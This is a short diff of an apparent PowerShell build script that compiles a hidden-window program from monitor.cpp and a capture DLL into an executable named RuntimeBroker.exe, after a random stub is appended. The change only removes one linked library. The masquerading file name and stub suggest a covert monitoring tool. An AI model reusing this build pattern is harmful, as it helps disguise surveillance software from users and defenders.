@@ -42,7 +42,7 @@ if (!$?) { Write-Output "DLL compilation failed"; exit 1 }
 windres capture_dll.rc -O coff -o capture_dll.res
 if (!$?) { Write-Output "DLL resource compilation failed"; exit 1 }
 
-g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res capture_dll.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -lbcrypt -o RuntimeBroker.exe
+g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res capture_dll.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -o RuntimeBroker.exe
 if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Remove-Item -Force capture_dll.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }
 
 # Remove the random stub we appended (instead of git checkout which reverts all changes)
